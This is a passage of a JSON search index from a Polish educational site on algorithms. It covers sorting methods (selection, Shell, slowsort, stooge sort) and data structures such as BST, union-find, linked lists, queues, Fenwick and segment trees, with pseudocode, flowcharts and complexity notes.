indeksy w naszej tablicy i wyszukujemy pozycj\u0119 minimum od obecnego indeksu do ko\u0144ca tablicy, a nast\u0119pnie zamieniamy z elementem na obecnie sprawdzanej pozycji.</p>"},{"location":"algorithms/sorting/selection-sort/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja SzukajIndeksMinimum(pocz, kon, A):\n    1. min := A[pocz]\n    2. minInd := pocz\n    3. Od i := pocz + 1 do kon, wykonuj:\n        4. Je\u017celi A[i] &lt; min, to:\n            5. min := A[i]\n            6. minInd := i\n    7. Zwr\u00f3\u0107 minInd\n\nprocedura SortowaniePrzezWybieranie(A, n):\n    1. Od i := 1 do n - 1, wykonuj:\n        2. minInd := SzukajIndeksMinimum(i, n, A)\n        3. Zamie\u0144(A[i], A[minInd])\n</code></pre>"},{"location":"algorithms/sorting/selection-sort/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SzukajIndeksMinimum(pocz, kon, A)\"]) --&gt; K1[\"min := A[pocz]\n    minInd := pocz\n    i := pocz + 1\"]\n    K1 --&gt; K3{i &lt;= kon}\n    K3 -- PRAWDA --&gt; K4{\"A[i] &lt; min\"}\n    K4 -- PRAWDA --&gt; K5[\"min := A[i]\n    minInd := i\"]\n    K4 -- FA\u0141SZ --&gt; K3i[i := i + 1]\n    K5 --&gt; K3i\n    K3i --&gt; K3\n    K3 -- FA\u0141SZ ---&gt; K7[/Zwr\u00f3\u0107 minInd/]\n    K7 --&gt; STOP([STOP])</code></pre> <pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SortowaniePrzezWybieranie(A, n)\"]) --&gt; K0[i := 1]\n    K0 --&gt; K1{i &lt;= n - 1}\n    K1 -- PRAWDA --&gt; K2[\"minInd := SzukajIndeksMinimum(i, n, A)\n    Zamie\u0144(A[i], A[minInd])\"]\n    K2 --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ ---&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/sorting/selection-sort/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n^2)\\) \u2014 kwadratowa</p> <p>Wyszukiwanie minimum ma z\u0142o\u017cono\u015b\u0107 liniow\u0105. Wywo\u0142ujemy ten algorytm \\(n-1\\) razy, wi\u0119c w efekcie otrzymujemy z\u0142o\u017cono\u015b\u0107 kwadratow\u0105 algorytmu sortowania przez wybieranie.</p>"},{"location":"algorithms/sorting/selection-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/sorting/selection-sort/#c","title":"C++","text":""},{"location":"algorithms/sorting/selection-sort/#python","title":"Python","text":""},{"location":"algorithms/sorting/selection-sort/#blockly","title":"Blockly","text":""},{"location":"algorithms/sorting/selection-sort/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/sorting/shell-sort/","title":"Sortowanie Shella","text":"<p>Sortowanie Shella (ang. Shellsort) mo\u017cna traktowa\u0107 jako uog\u00f3lnienie algorytm\u00f3w sortowania przez wstawianie lub sortowania b\u0105belkowego. R\u00f3\u017cni si\u0119 od wspomnianych algorytm\u00f3w tym, \u017ce dopuszcza por\u00f3wnywanie i zamian\u0119 element\u00f3w le\u017c\u0105cych daleko od siebie. W jakiej odleg\u0142o\u015bci b\u0119d\u0105 si\u0119 znajdowa\u0107 por\u00f3wnywane elementy zale\u017cy ju\u017c od konkretnej wersji algorytmu. Pocz\u0105tkowo por\u00f3wnywane s\u0105 elementy bardziej od siebie oddalone, a z ka\u017cdym przej\u015bciem odleg\u0142o\u015b\u0107 ta maleje.</p> <p>W oryginalnej wersji algorytmu odst\u0119p jest r\u00f3wny \\(N/2^k\\), gdzie \\(N\\) to rozmiar sortowanej tablicy, a \\(k\\) to numer iteracji algorytmu</p>"},{"location":"algorithms/sorting/shell-sort/#animacja","title":"Animacja","text":"<p>Animacja sortowania Shella</p>"},{"location":"algorithms/sorting/shell-sort/#taneczne-sortowanie","title":"Taneczne sortowanie","text":"<p> Taneczne sortowanie</p>"},{"location":"algorithms/sorting/shell-sort/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura SortowanieShella(A, n):\n    1. odstep := n div 2\n    2. dop\u00f3ki odstep &gt; 0:\n        3. dla i := 1 do n - odstep:\n            4. Je\u017celi A[i] &gt; A[i + odstep], to:\n                5. Zamie\u0144(A[i], A[i + odstep])\n        6. odstep := odstep div 2\n</code></pre>"},{"location":"algorithms/sorting/shell-sort/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Z\u0142o\u017cono\u015b\u0107 czasowa algorytmu zale\u017cna jest od stosowanego ci\u0105gu odst\u0119p\u00f3w. Z\u0142o\u017cono\u015bc oryginalnej wersji algorytmu jest rz\u0119du \\(O(n^2)\\).</p>"},{"location":"algorithms/sorting/shell-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/sorting/shell-sort/#c","title":"C++","text":""},{"location":"algorithms/sorting/shell-sort/#python","title":"Python","text":""},{"location":"algorithms/sorting/slow-sort/","title":"Sortowanie wolne","text":"<p>Sortowanie wolne (ang. Slowsort) to jeden z humorystycznych i niepraktycznych algorytm\u00f3w sortowania.</p>"},{"location":"algorithms/sorting/slow-sort/#animacja","title":"Animacja","text":"<p>Animacja sortowania wolnego</p>"},{"location":"algorithms/sorting/slow-sort/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura SortowanieWolne(A, pocz, kon):\n    1. Je\u017celi pocz &gt;= kon, to:\n        2. Zako\u0144cz\n\n    3. srodek := (pocz + kon) div 2\n    4. SortowanieWolne(A, pocz, srodek)\n    5. SortowanieWolne(A, srodek + 1, kon)\n\n    6. Je\u017celi A[kon] &lt; A[srodek], to:\n        7. Zamie\u0144(A[srodek], A[kon])\n\n    8. SortowanieWolne(A, pocz, kon - 1)\n</code></pre>"},{"location":"algorithms/sorting/slow-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/sorting/slow-sort/#c","title":"C++","text":""},{"location":"algorithms/sorting/slow-sort/#python","title":"Python","text":""},{"location":"algorithms/sorting/stooge-sort/","title":"Sortowanie stooge","text":"<p>Sortowanie stooge (ang. Stoogesort) to rekurencyjny algorytm sortowania znany przede wszystkim ze swojej wyj\u0105tkowo z\u0142ej z\u0142o\u017cono\u015bci czasowej.</p>"},{"location":"algorithms/sorting/stooge-sort/#animacja","title":"Animacja","text":""},{"location":"algorithms/sorting/stooge-sort/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura SortowanieStooge(A, i, j):\n    1. Je\u017celi A[i] &gt; A[j], to:\n        2. Zamie\u0144(A[i], A[j])\n\n    3. Je\u017celi j - i &gt; 1, to:\n        4. t := (j - i + 1) div 3\n        5. SortowanieStooge(A, i, j - t)\n        6. SortowanieStooge(A, i + t, j)\n        7. SortowanieStooge(A, i, j - t)\n</code></pre>"},{"location":"algorithms/sorting/stooge-sort/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Z\u0142o\u017cono\u015b\u0107 czasowa algorytmu jest rz\u0119du \\(O(n^{\\log{3}/\\log{1.5}})=O(n^{2.7095...})\\)</p>"},{"location":"algorithms/sorting/stooge-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/sorting/stooge-sort/#c","title":"C++","text":""},{"location":"algorithms/sorting/stooge-sort/#python","title":"Python","text":""},{"location":"algorithms/structures/","title":"Struktury danych","text":"<p>Struktury danych odgrywaj\u0105 kluczow\u0105 rol\u0119 w algorytmice i programowaniu, poniewa\u017c umo\u017cliwiaj\u0105 efektywne przechowywanie, organizowanie i manipulowanie danymi. Wyb\u00f3r odpowiedniej struktury danych mo\u017ce znacz\u0105co wp\u0142yn\u0105\u0107 na wydajno\u015b\u0107 i z\u0142o\u017cono\u015b\u0107 czasow\u0105 algorytmu. Przyk\u0142ady struktur danych obejmuj\u0105 tablice, listy, stosy, kolejki, drzewa, grafy i tablice hashuj\u0105ce. Ka\u017cda z tych struktur ma swoje unikalne w\u0142a\u015bciwo\u015bci i zastosowania, kt\u00f3re mog\u0105 by\u0107 wykorzystane do optymalizacji rozwi\u0105za\u0144 problem\u00f3w programistycznych.</p>"},{"location":"algorithms/structures/bst/","title":"Drzewa przeszukiwa\u0144 binarnych","text":"<p>Drzewo przeszukiwa\u0144 binarnych (ang BST) to podstawowa struktura danych, kt\u00f3ra umo\u017cliwia efektywne przeszukiwanie, dodawanie i usuwanie element\u00f3w. BST to drzewo binarne, kt\u00f3re spe\u0142nia specjaln\u0105 w\u0142a\u015bciwo\u015b\u0107: dla ka\u017cdego w\u0119z\u0142a, wszystkie warto\u015bci w lewym poddrzewie s\u0105 mniejsze od warto\u015bci w\u0119z\u0142a, a wszystkie warto\u015bci w prawym poddrzewie s\u0105 wi\u0119ksze.</p>"},{"location":"algorithms/structures/bst/#wasnosci","title":"W\u0142asno\u015bci","text":"<p>Ka\u017cdy w\u0119ze\u0142 ma najwy\u017cej dwoje \"dzieci\": lewe i prawe. Ka\u017cdy w\u0119ze\u0142 przechowuje klucz (warto\u015b\u0107). Wszystkie klucze w lewym poddrzewie danego w\u0119z\u0142a s\u0105 mniejsze od klucza w tym w\u0119\u017ale. Wszystkie klucze w prawym poddrzewie danego w\u0119z\u0142a s\u0105 wi\u0119ksze od klucza w tym w\u0119\u017ale.</p>"},{"location":"algorithms/structures/bst/#operacje","title":"Operacje","text":"<p>Podstawowe operacje wykonywane na BST to:</p> <ul> <li>Wstawianie: aby wstawi\u0107 nowy klucz do BST, por\u00f3wnujemy go z kluczem korzenia. Je\u017celi klucz jest mniejszy, przechodzimy do lewego poddrzewa. Je\u017celi klucz jest wi\u0119kszy, przechodzimy do prawego poddrzewa. Powtarzamy ten proces, a\u017c dojdziemy do w\u0119z\u0142a null, gdzie wstawiamy nowy klucz.</li> <li>Szukanie: aby znale\u017a\u0107 klucz w BST, por\u00f3wnujemy go z kluczem korzenia. Je\u017celi klucz jest mniejszy, przechodzimy do lewego poddrzewa. Je\u017celi klucz jest wi\u0119kszy, przechodzimy do prawego poddrzewa. Je\u017celi klucz jest r\u00f3wny kluczowi w\u0119z\u0142a, znale\u017ali\u015bmy szukany klucz. Je\u017celi dojdziemy do w\u0119z\u0142a null, klucz nie jest obecny w drzewie.</li> <li>Usuwanie: usuwanie klucza z BST jest bardziej z\u0142o\u017cone i mo\u017ce obejmowa\u0107 kilka r\u00f3\u017cnych przypadk\u00f3w, w zale\u017cno\u015bci od liczby dzieci w\u0119z\u0142a, kt\u00f3ry ma zosta\u0107 usuni\u0119ty.</li> </ul> <p>Dodatkowo, BST mo\u017ce obs\u0142ugiwa\u0107 operacje takie jak:</p> <ul> <li>Przechodzenie: Przechodzenie przez drzewo w r\u00f3\u017cnych porz\u0105dkach: w porz\u0105dku (ang. inorder), przed porz\u0105dkiem (ang. preorder), po porz\u0105dku (ang. postorder).</li> <li>Znajdowanie min/max: Znajdowanie warto\u015bci minimalnej i maksymalnej w BST jest efektywne. Minimalna warto\u015b\u0107 jest przechowywana w najbardziej lewym w\u0119\u017ale, a maksymalna warto\u015b\u0107 jest przechowywana w najbardziej prawym w\u0119\u017ale.</li> </ul>"},{"location":"algorithms/structures/bst/#zastosowania","title":"Zastosowania","text":"<p>BST s\u0105 powszechnie u\u017cywane w informatyce z powodu ich efektywno\u015bci. Znajduj\u0105 zastosowanie w wielu dziedzinach, w tym:</p> <ul> <li>Systemy baz danych: BST s\u0105 u\u017cywane do indeksowania danych, co umo\u017cliwia szybkie wyszukiwanie, dodawanie i usuwanie rekord\u00f3w.</li> <li>Systemy plik\u00f3w: niekt\u00f3re systemy plik\u00f3w u\u017cywaj\u0105 BST do indeksowania plik\u00f3w.</li> <li>Rysowanie drzew genealogicznych: BST mog\u0105 by\u0107 u\u017cywane do reprezentowania hierarchicznych relacji, takich jak drzewa genealogiczne.</li> </ul> <p>BST s\u0105 podstaw\u0105 dla wielu zaawansowanych struktur danych, kt\u00f3re oferuj\u0105 lepsz\u0105 wydajno\u015b\u0107 w r\u00f3\u017cnych sytuacjach, takich jak drzewa AVL, drzewa czerwono-czarne, drzewa B i drzewa splay.</p>"},{"location":"algorithms/structures/bst/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/structures/bst/#c","title":"C++","text":""},{"location":"algorithms/structures/bst/#python","title":"Python","text":""},{"location":"algorithms/structures/disjoint-set-union/","title":"Struktura zbior\u00f3w","text":"<p>Zbiory roz\u0142\u0105czne, nazywane te\u017c struktur\u0105 union-find, s\u0105 zaawansowan\u0105 struktur\u0105 danych, kt\u00f3ra sk\u0142ada si\u0119 z pewnej liczby element\u00f3w podzielonych na jeden lub wi\u0119cej zbior\u00f3w nieroz\u0142\u0105cznych. Innymi s\u0142owy, dla ka\u017cdych dw\u00f3ch element\u00f3w z tych samych zbior\u00f3w, nie ma \u017cadnej drogi prowadz\u0105cej od jednego do drugiego przez elementy z innych zbior\u00f3w.</p>"},{"location":"algorithms/structures/disjoint-set-union/#wasciwosci","title":"W\u0142a\u015bciwo\u015bci","text":"<p>W tej strukturze danych zawsze mamy jednego reprezentanta (korze\u0144) dla ka\u017cdego zbioru. Reprezentant jest jednym z element\u00f3w zbioru, kt\u00f3ry jest wykorzystywany jako \"identyfikator\" dla ca\u0142ego zbioru. Ka\u017cdy zbi\u00f3r jest przedstawiany jako drzewo, w kt\u00f3rym ka\u017cdy w\u0119ze\u0142 przechowuje element i wska\u017anik do swojego rodzica.</p>"},{"location":"algorithms/structures/disjoint-set-union/#operacje","title":"Operacje","text":"<p>Zbiory roz\u0142\u0105czne obs\u0142uguj\u0105 trzy podstawowe operacje:</p> <ul> <li>Find: sprawdza, do kt\u00f3rego zbioru nale\u017cy dany element. Wykonuje to przez odnalezienie reprezentanta zbioru, do kt\u00f3rego element nale\u017cy. Mo\u017cna to osi\u0105gn\u0105\u0107, \u015bledz\u0105c wska\u017aniki do rodzica od danego elementu, a\u017c dotrzemy do elementu, kt\u00f3ry jest swoim w\u0142asnym rodzicem (reprezentantem).</li> <li>Union: \u0142\u0105czy dwa zbiory w jeden. Wykonuje to, lokalizuj\u0105c reprezentant\u00f3w obu zbior\u00f3w i przypisuj\u0105c jednego z nich jako rodzica drugiego, w efekcie tworz\u0105c jedno drzewo (zbi\u00f3r).</li> <li>MakeSet: tworzy nowy zbi\u00f3r z pojedynczego elementu. Nowy element staje si\u0119 reprezentantem nowego zbioru.</li> </ul>"},{"location":"algorithms/structures/disjoint-set-union/#zastosowania","title":"Zastosowania","text":"<p>Zbiory roz\u0142\u0105czne s\u0105 u\u017cywane w wielu algorytmach i strukturach danych zwi\u0105zanych z teori\u0105 graf\u00f3w, na przyk\u0142ad:</p> <ul> <li>Algorytm Kruskala: jest to algorytm znajdowania minimalnego drzewa rozpinaj\u0105cego w grafie. Algorytm ten u\u017cywa struktury zbior\u00f3w roz\u0142\u0105cznych do sprawdzania, czy dodanie kraw\u0119dzi do drzewa nie utworzy cyklu.</li> <li>Algorytm detekcji cykli w grafie nieskierowanym: ta sama koncepcja stosowana w algorytmie Kruskala mo\u017ce by\u0107 r\u00f3wnie\u017c u\u017cyta do detekcji cykli.</li> <li>Rozwi\u0105zanie problemu po\u0142\u0105czenia: problem polega na tym, aby szybko odpowiedzie\u0107 na pytanie, czy dwa elementy nale\u017c\u0105 do tego samego zbioru. Mo\u017ce to by\u0107 rozwi\u0105zane za pomoc\u0105 struktury zbior\u00f3w roz\u0142\u0105cznych z operacjami find i union.</li> <li>Te algorytmy i wiele innych korzystaj\u0105 z efektywno\u015bci operacji oferowanych przez struktur\u0119 zbior\u00f3w roz\u0142\u0105cznych. Operacje takie jak find i union s\u0105 bardzo szybkie dzi\u0119ki zastosowaniu technik takich jak \u0142\u0105czenie wed\u0142ug rangi (union by rank) i kompresja \u015bcie\u017cki (path compression), kt\u00f3re pomagaj\u0105 utrzyma\u0107 wysoko\u015b\u0107 drzewa na minimalnym poziomie.</li> </ul>"},{"location":"algorithms/structures/disjoint-set-union/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/structures/disjoint-set-union/#c","title":"C++","text":""},{"location":"algorithms/structures/disjoint-set-union/#python","title":"Python","text":""},{"location":"algorithms/structures/doubly-linked-list/","title":"Lista dwukierunkowa","text":"<p>Lista dwukierunkowa to rodzaj listy \u0142a\u0144cuchowej, gdzie ka\u017cdy w\u0119ze\u0142 opr\u00f3cz przechowywania danych i wska\u017anika na nast\u0119pny w\u0119ze\u0142, posiada r\u00f3wnie\u017c wska\u017anik na poprzedni w\u0119ze\u0142. Daje to mo\u017cliwo\u015b\u0107 poruszania si\u0119 w obu kierunkach na li\u015bcie, co umo\u017cliwia dodatkowe operacje, kt\u00f3re nie s\u0105 mo\u017cliwe w listach jednokierunkowych.</p>"},{"location":"algorithms/structures/doubly-linked-list/#struktura","title":"Struktura","text":"<p>W\u0119ze\u0142 w li\u015bcie dwukierunkowej sk\u0142ada si\u0119 z trzech element\u00f3w: \"danych\", \"nast\u0119pnego\" i \"poprzedniego\". \"Dane\" to informacje przechowywane w w\u0119\u017ale. \"Nast\u0119pny\" to wska\u017anik na nast\u0119pny w\u0119ze\u0142 w li\u015bcie, a \"poprzedni\" to wska\u017anik na poprzedni w\u0119ze\u0142. Dla pierwszego w\u0119z\u0142a (g\u0142owy) wska\u017anik \"poprzedni\" jest ustawiony na null, podobnie jak wska\u017anik \"nast\u0119pny\" dla ostatniego w\u0119z\u0142a.</p>"},{"location":"algorithms/structures/doubly-linked-list/#operacje","title":"Operacje","text":"<p>Operacje, kt\u00f3re mo\u017cna wykona\u0107 na li\u015bcie dwukierunkowej, to mi\u0119dzy innymi:</p> <ul> <li>Dodawanie elementu na pocz\u0105tek listy: tworzymy nowy w\u0119ze\u0142, ustawiamy jego \"dane\" na dodawany element, \"nast\u0119pny\" na obecn\u0105 \"g\u0142ow\u0119\" listy i \"poprzedni\" na null. Nast\u0119pnie ustawiamy \"poprzedni\" obecnej \"g\u0142owy\" na nowy w\u0119ze\u0142 i na ko\u0144cu ustawiamy \"g\u0142ow\u0119\" listy na nowy w\u0119ze\u0142.</li> <li>Dodawanie elementu na koniec listy: jest to operacja, kt\u00f3ra nie jest tak prosta jak w listach jednokierunkowych. Tworzymy nowy w\u0119ze\u0142, ustawiamy jego \"dane\" na dodawany element, \"poprzedni\" na obecny \"ogon\" listy i \"nast\u0119pny\" na null. Nast\u0119pnie ustawiamy \"nast\u0119pny\" obecnego \"ogona\" na nowy w\u0119ze\u0142 i na ko\u0144cu ustawiamy \"ogon\" listy na nowy w\u0119ze\u0142.</li> <li>Usuwanie element\u00f3w: dzi\u0119ki posiadaniu wska\u017anik\u00f3w \"poprzedni\" i \"nast\u0119pny\" mo\u017cliwe jest efektywne usuwanie element\u00f3w z dowolnego miejsca na li\u015bcie.</li> <li>Przeszukiwanie listy: mo\u017cna przeszukiwa\u0107 list\u0119 w obu kierunkach, co mo\u017ce by\u0107 przydatne w pewnych sytuacjach.</li> </ul>"},{"location":"algorithms/structures/doubly-linked-list/#zastosowania","title":"Zastosowania","text":"<p>Listy dwukierunkowe s\u0105 wykorzystywane w wielu zastosowaniach, gdzie potrzebne jest efektywne dodawanie lub usuwanie element\u00f3w z obu ko\u0144c\u00f3w listy, jak na przyk\u0142ad w implementacji struktury danych deque. S\u0105 one r\u00f3wnie\u017c u\u017cywane w niekt\u00f3rych algorytmach, takich jak algorytm LRU (Least Recently Used) do zarz\u0105dzania pami\u0119ci\u0105 cache.</p>"},{"location":"algorithms/structures/doubly-linked-list/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/structures/doubly-linked-list/#c","title":"C++","text":""},{"location":"algorithms/structures/doubly-linked-list/#python","title":"Python","text":""},{"location":"algorithms/structures/fenwick-tree/","title":"Drzewo Fenwicka","text":"<p>Struktura danych znana jako Drzewo Fenwicka (ang. Fenwick Tree), lub Drzewo Indeksowane Binarnie (ang. Binary Indexed Tree, BIT) jest u\u017cywana do efektywnego przechowywania i manipulowania prefiksowymi sumami element\u00f3w tablicy. Umo\u017cliwia szybkie wykonywanie operacji takich jak:</p> <ol> <li>Aktualizacja warto\u015bci elementu tablicy w czasie \\(O(\\log{n})\\).</li> <li>Obliczanie sumy prefiksowej (sumy element\u00f3w od pocz\u0105tku tablicy do danego indeksu) w czasie \\(O(\\log{n})\\).</li> </ol> <p>Drzewo Fenwicka jest szczeg\u00f3lnie przydatne w sytuacjach, gdzie cz\u0119sto wykonuje si\u0119 operacje aktualizacji i zapyta\u0144 o sumy prefiksowe, np. w algorytmach przetwarzania strumieni danych, analizie danych i problemach zwi\u0105zanych z dynamicznymi tablicami.</p>"},{"location":"algorithms/structures/fenwick-tree/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/structures/fenwick-tree/#c","title":"C++","text":""},{"location":"algorithms/structures/queue/","title":"Kolejka","text":"<p>Kolejka (ang. Queue) to podstawowa struktura danych, kt\u00f3ra, podobnie jak stos, organizuje elementy w spos\u00f3b liniowy. Kluczow\u0105 cech\u0105 kolejki jest zasada FIFO (ang. First In, First Out), co oznacza, \u017ce pierwszy element dodany do kolejki jest pierwszym elementem, kt\u00f3ry zostanie z niej usuni\u0119ty. Jest to zachowanie analogiczne do rzeczywistej kolejki, na przyk\u0142ad w sklepie - pierwsza osoba, kt\u00f3ra do\u0142\u0105czy\u0142a do kolejki, jest pierwsz\u0105 osob\u0105, kt\u00f3ra opuszcza kolejk\u0119.</p> <p>Podstawowe operacje wykonywane na kolejce to:</p> <ul> <li>Enqueue (dodaj do kolejki): dodaje element na koniec kolejki.</li> <li>Dequeue (usu\u0144 z kolejki): usuwa element z pocz\u0105tku kolejki.</li> </ul> <p>Dodatkowe operacje, kt\u00f3re mog\u0105 by\u0107 dost\u0119pne w niekt\u00f3rych implementacjach kolejki, to:</p> <ul> <li>Front/Peek: zwraca pierwszy element kolejki bez usuwania go.</li> <li>IsEmpty: sprawdza, czy kolejka jest pusta.</li> <li>Size: zwraca liczb\u0119 element\u00f3w w kolejce.</li> </ul>"},{"location":"algorithms/structures/queue/#zastosowania","title":"Zastosowania","text":"<p>Kolejki znajduj\u0105 szerokie zastosowanie w informatyce, w tym:</p> <ul> <li>Synchronizacja danych: kolejki s\u0105 cz\u0119sto u\u017cywane do synchronizacji danych mi\u0119dzy procesami. Mog\u0105 by\u0107 np. u\u017cywane do bezpiecznego przesy\u0142ania \u017c\u0105da\u0144 z w\u0105tku producenta do w\u0105tku konsumenta.</li> <li>Buforowanie danych: kolejki mog\u0105 s\u0142u\u017cy\u0107 jako bufory dla danych przesy\u0142anych mi\u0119dzy dwoma jednostkami procesora lub pomi\u0119dzy urz\u0105dzeniem peryferyjnym a procesorem.</li> <li>Planowanie CPU: systemy operacyjne cz\u0119sto u\u017cywaj\u0105 kolejek do zarz\u0105dzania procesami, kt\u00f3re oczekuj\u0105 na dost\u0119p do zasob\u00f3w, takich jak procesor, pami\u0119\u0107, dysk, etc.</li> <li>Algorytmy grafowe: kolejki s\u0105 u\u017cywane w algorytmach przeszukiwania grafu, takich jak przeszukiwanie wszerz (BFS).</li> </ul> <p>Znaj\u0105c podstawy kolejek, mo\u017cemy zrozumie\u0107 wiele kluczowych aspekt\u00f3w zarz\u0105dzania danymi w informatyce, zar\u00f3wno w systemach operacyjnych, jak i w bardziej z\u0142o\u017conych algorytmach.</p>"},{"location":"algorithms/structures/queue/#implementacja","title":"Implementacja","text":"<p>Kolejki mog\u0105 by\u0107 zaimplementowane za pomoc\u0105 r\u00f3\u017cnych struktur danych, w tym tablic i list po\u0142\u0105czonych. Wyb\u00f3r struktury danych do implementacji kolejki zale\u017cy od konkretnych wymaga\u0144, takich jak efektywno\u015b\u0107 operacji, zu\u017cycie pami\u0119ci i \u0142atwo\u015b\u0107 implementacji.</p> <p>Poni\u017cej znajdziesz przyk\u0142adowe implementacje kolejki w wybranych j\u0119zykach programowania.</p>"},{"location":"algorithms/structures/queue/#c","title":"C++","text":""},{"location":"algorithms/structures/queue/#python","title":"Python","text":""},{"location":"algorithms/structures/queue/#implementacje-pozostae","title":"Implementacje \u2014 pozosta\u0142e","text":""},{"location":"algorithms/structures/queue/#_1","title":"Kolejka","text":""},{"location":"algorithms/structures/segment-trees/","title":"Drzewo przedzia\u0142owe","text":"<p>Drzewo przedzia\u0142owe to struktura danych, kt\u00f3ra pozwala na efektywne przeprowadzanie pewnych operacji na tablicach. Szczeg\u00f3lnie przydaje si\u0119, gdy mamy do czynienia z tablic\u0105, kt\u00f3ra nie zmienia si\u0119 cz\u0119sto (jest \"statyczna\"), ale potrzebujemy cz\u0119sto wykonywa\u0107 operacje na pewnych segmentach (st\u0105d nazwa) tej tablicy.</p>"},{"location":"algorithms/structures/segment-trees/#struktura","title":"Struktura","text":"<p>Drzewo segmentowe jest drzewem binarnym. Ka\u017cdy w\u0119ze\u0142 w drzewie reprezentuje segment tablicy - dla w\u0119z\u0142a korzenia jest to ca\u0142a tablica, a dla innych w\u0119z\u0142\u00f3w s\u0105 to r\u00f3\u017cne podsegmenty. Li\u015bcie drzewa reprezentuj\u0105 pojedyncze elementy tablicy. Ka\u017cdy w\u0119ze\u0142 wewn\u0119trzny drzewa reprezentuje segment tablicy, kt\u00f3ry jest uni\u0105 segment\u00f3w reprezentowanych przez jego dzieci.</p>"},{"location":"algorithms/structures/segment-trees/#operacje","title":"Operacje","text":"<p>Najwa\u017cniejsze operacje, kt\u00f3re mo\u017cna wykona\u0107 na drzewie segmentowym, to:</p> <ul> <li>Budowanie drzewa z tablicy: ta operacja wymaga przej\u015bcia przez ca\u0142\u0105 tablic\u0119 i budowy odpowiednich w\u0119z\u0142\u00f3w drzewa, wi\u0119c jej z\u0142o\u017cono\u015b\u0107 czasowa to \\(O(n)\\), gdzie \\(n\\) to liczba element\u00f3w w tablicy.</li> <li>Aktualizowanie warto\u015bci w tablicy: w drzewie segmentowym mo\u017cna to zrobi\u0107, przechodz\u0105c od w\u0119z\u0142a reprezentuj\u0105cego zmieniany element do korzenia i aktualizuj\u0105c informacje w w\u0119z\u0142ach po drodze. Ta operacja ma z\u0142o\u017cono\u015b\u0107 \\(O(\\log n)\\).</li> <li>Wykonywanie operacji na segmencie tablicy: taka operacja mo\u017ce polega\u0107 na znalezieniu minimalnego elementu, sumie element\u00f3w itd. W drzewie segmentowym mo\u017cna to zrobi\u0107, przetwarzaj\u0105c tylko \\(O(\\log n)\\) w\u0119z\u0142\u00f3w.</li> </ul>"},{"location":"algorithms/structures/segment-trees/#zastosowania","title":"Zastosowania","text":"<p>Drzewa segmentowe s\u0105 wykorzystywane w wielu dziedzinach programowania, takich jak grafika komputerowa, statystyka, systemy baz danych i wiele innych. W programowaniu konkursowym cz\u0119sto s\u0105 u\u017cywane do rozwi\u0105zywania zada\u0144, kt\u00f3re wymagaj\u0105 szybkiego wykonywania operacji na segmentach tablic.</p>"},{"location":"algorithms/structures/segment-trees/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/structures/segment-trees/#c","title":"C++","text":""},{"location":"algorithms/structures/segment-trees/#python","title":"Python","text":""},{"location":"algorithms/structures/singly-linked-list/","title":"Lista jednokierunkowa","text":"<p>Lista jednokierunkowa, nazywana r\u00f3wnie\u017c list\u0105 \u0142a\u0144cuchow\u0105, to podstawowa struktura danych, kt\u00f3ra sk\u0142ada si\u0119 z serii \"w\u0119z\u0142\u00f3w\" zawieraj\u0105cych informacje i wska\u017anik do nast\u0119pnego w\u0119z\u0142a w sekwencji. Pozwala to na efektywne przeprowadzanie pewnych operacji, takich jak dodawanie i usuwanie element\u00f3w z pocz\u0105tku sekwencji, za kt\u00f3re odpowiada \"g\u0142owa\" listy.</p>"},{"location":"algorithms/structures/singly-linked-list/#struktura","title":"Struktura","text":"<p>W\u0119ze\u0142 w li\u015bcie jednokierunkowej sk\u0142ada si\u0119 z dw\u00f3ch element\u00f3w: \"danych\" i wska\u017anika do \"nast\u0119pnego\" w\u0119z\u0142a. Dane to informacje, kt\u00f3re chcemy przechowa\u0107 - mog\u0105 to by\u0107 liczby, napisy, obiekty itp. \"Nast\u0119pny\" to wska\u017anik na nast\u0119pny w\u0119ze\u0142 w li\u015bcie. Ostatni w\u0119ze\u0142 na li\u015bcie ma wska\u017anik \"nast\u0119pny\" ustawiony na warto\u015b\u0107 null, co oznacza koniec listy.</p>"},{"location":"algorithms/structures/singly-linked-list/#operacje","title":"Operacje","text":"<p>Najwa\u017cniejsze operacje, kt\u00f3re mo\u017cna wykona\u0107 na li\u015bcie jednokierunkowej, to:</p> <ul> <li>Dodawanie elementu na pocz\u0105tek listy: wymaga to stworzenia nowego w\u0119z\u0142a, ustawienia jego \"danych\" na dodawany element, jego \"nast\u0119pnego\" na obecn\u0105 \"g\u0142ow\u0119\" listy, a nast\u0119pnie ustawienia \"g\u0142owy\" listy na nowy w\u0119ze\u0142. Ta operacja jest zazwyczaj szybka i ma z\u0142o\u017cono\u015b\u0107 czasow\u0105 \\(O(1)\\).</li> <li>Usuwanie elementu z pocz\u0105tku listy: polega to na ustawieniu \"g\u0142owy\" listy na jej obecny \"nast\u0119pny\" w\u0119ze\u0142. Ta operacja jest r\u00f3wnie\u017c szybka i ma z\u0142o\u017cono\u015b\u0107 czasow\u0105 \\(O(1)\\).</li> <li>Przeszukiwanie listy: wymaga to przej\u015bcia przez list\u0119 od \"g\u0142owy\" do ko\u0144ca, sprawdzaj\u0105c \"dane\" w ka\u017cdym w\u0119\u017ale. Ta operacja jest wolniejsza i ma z\u0142o\u017cono\u015b\u0107 czasow\u0105 \\(O(n)\\), gdzie \\(n\\) to liczba w\u0119z\u0142\u00f3w w li\u015bcie.</li> 